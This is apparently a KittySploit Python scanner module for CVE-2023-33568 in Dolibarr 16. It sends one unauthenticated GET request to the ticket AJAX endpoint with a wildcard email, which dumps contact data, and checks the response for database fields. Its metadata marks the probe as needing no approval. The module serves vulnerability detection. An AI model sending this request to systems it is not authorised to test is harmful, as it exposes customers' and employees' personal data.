#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An issue in Dolibarr 16 before 16."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Dolibarr Unauthenticated Contacts Database Theft Detection',
        'description': "An issue in Dolibarr 16 before 16.0.5 allows unauthenticated attackers to perform a database dump and access a company's entire customer file, prospects, suppliers, and employee information if a contact file exists.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'dolibarr', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.dsecbypass.com/en/dolibarr-pre-auth-contact-database-dump/',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-33568',
            'https://github.com/Dolibarr/dolibarr/commit/bb7b69ef43673ed403436eac05e0bc31d5033ff7',
            'https://github.com/Dolibarr/dolibarr/commit/be82f51f68d738cce205f4ce5b469ef42ed82d9e',
            'https://www.dolibarr.org/forum/t/dolibarr-16-0-security-breach/23471',
        ],
        'cve': 'CVE-2023-33568',
    }

    def run(self):
        r = self.http_request(method="GET", path='/public/ticket/ajax/ajax.php?action=getContacts&email=%', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"database_name":', '"database_user":',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Dolibarr Unauthenticated Contacts Database Theft detected",
                path='/public/ticket/ajax/ajax.php?action=getContacts&email=%',
            )
            return True
        return False

